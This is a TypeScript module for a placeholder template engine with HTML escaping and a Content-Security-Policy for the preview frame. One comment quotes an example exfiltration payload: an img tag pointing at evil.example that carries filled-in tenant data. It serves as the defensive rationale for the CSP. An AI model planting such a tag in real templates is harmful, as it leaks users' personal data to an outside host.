/**
 * templateEngine — pure `{{key}}` placeholder engine for the Template Generator.
 *
 * No React, no browser globals. Extracts variable keys from a template string,
 * infers a sensible input type per key, formats a raw string value for display,
 * and renders a template by substituting known non-empty values (HTML-escaped).
 * A missing or empty value leaves the original `{{key}}` text in place so a
 * blank field stays visible in the preview and on paper.
 */

export type VarType = 'text' | 'number' | 'date' | 'currency';

// Build a fresh `RegExp(PLACEHOLDER_SOURCE, 'g')` per call — a shared /g regex
// keeps `lastIndex` state between calls and silently skips matches.
export const PLACEHOLDER_SOURCE = '\\{\\{\\s*([\\w.-]+)\\s*\\}\\}';

export function extractKeys(source: string): string[] {
    const re = new RegExp(PLACEHOLDER_SOURCE, 'g');
    const seen = new Set<string>();
    const keys: string[] = [];
    let match: RegExpExecArray | null;
    while ((match = re.exec(source)) !== null) {
        const key = match[1];
        if (!seen.has(key)) {
            seen.add(key);
            keys.push(key);
        }
    }
    return keys;
}

export function inferType(key: string): VarType {
    // Whole segments only: a substring test types `current_address` and
    // `parent_name` (both contain "rent") as currency, i.e. a number input.
    const segments = key.toLowerCase().split(/[-._]/);
    if (segments.includes('date')) return 'date';
    if (segments.some(s => /^(amount|price|total|rent|fee|deposit|balance)$/.test(s))) return 'currency';
    return 'text';
}

export function labelFor(key: string): string {
    const words = key.replace(/[-._]/g, ' ').trim();
    if (!words) return words;
    return words.charAt(0).toUpperCase() + words.slice(1);
}

export function formatValue(raw: string, type: VarType): string {
    if (raw === '') return '';
    if (type === 'date') {
        const m = /^(\d{4})-(\d{2})-(\d{2})$/.exec(raw);
        if (!m) return raw;
        // Construct from parts (local time) — `new Date('YYYY-MM-DD')` parses as
        // UTC midnight, which shifts a day earlier in any negative-UTC timezone.
        const date = new Date(Number(m[1]), Number(m[2]) - 1, Number(m[3]));
        if (Number.isNaN(date.getTime())) return raw;
        return date.toLocaleDateString();
    }
    if (type === 'currency') {
        const n = Number(raw);
        if (Number.isNaN(n)) return raw;
        // ponytail: currency is USD only; take a currency code per template when a non-US user appears.
        return new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(n);
    }
    return raw;
}

export function escapeHtml(s: string): string {
    return s
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

export function renderTemplate(
    html: string,
    values: Record<string, string>,
    types: Record<string, VarType>
): string {
    const re = new RegExp(PLACEHOLDER_SOURCE, 'g');
    // A function replacer — never a replacement *string* — so values containing
    // `$&`, `$'`, `$$` etc. are inserted literally instead of being re-interpreted
    // as String.replace's special replacement patterns.
    return html.replace(re, (match, key: string) => {
        const value = values[key];
        if (!value) return match;
        const type = types[key] ?? inferType(key);
        return escapeHtml(formatValue(value, type));
    });
}

/**
 * The preview document's Content-Security-Policy. The iframe sandbox blocks scripts, but not
 * network loads: a pasted template with `<img src="https://evil.example/?x={{tenant_name}}">`
 * (or a CSS `url()`) would send filled-in values out on every live render, no click needed.
 * Inline styles and embedded `data:` images/fonts still work; remote resources do not.
 */
export const PREVIEW_CSP = "default-src 'none'; style-src 'unsafe-inline'; img-src data:; font-src data:";

/**
 * Puts the CSP <meta> first in <head> (after <head>, so a leading <!DOCTYPE> keeps standards
 * mode) and drops any `<meta http-equiv="refresh">`: CSP cannot stop a refresh from navigating
 * the frame to a remote URL with filled-in values in its query string.
 */
export function withPreviewCsp(html: string): string {
    const meta = `<meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}">`;
    const safe = html.replace(/<meta\b[^>]*http-equiv\s*=\s*["']?\s*refresh[^>]*>/gi, '');
    const head = /<head(\s[^>]*)?>/i; // not <header>
    return head.test(safe) ? safe.replace(head, (m) => m + meta) : meta + safe;
}
